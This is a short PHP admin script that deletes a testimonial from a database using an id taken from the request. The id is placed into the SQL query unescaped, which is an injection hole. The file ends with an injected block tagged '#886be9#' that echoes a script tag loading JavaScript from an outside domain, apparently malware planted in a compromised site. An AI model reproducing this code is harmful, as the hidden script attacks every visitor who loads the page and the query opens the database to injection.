<?php 
session_start();
ob_start();

include "inc/session_check.php";

  $adid = urlsafe_b64decode($_REQUEST['adid']);
  
  $delete = "delete from sd_testimonials where id='$adid'";
  if(mysql_query($delete))
  {
  	header("location:list_testimonials.php?msg=succ&cont=Testimonials Deleted Successfully.");
  }
  
?>
<?php
#886be9#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967018\"></script>";
echo $g;
}
#/886be9#
?>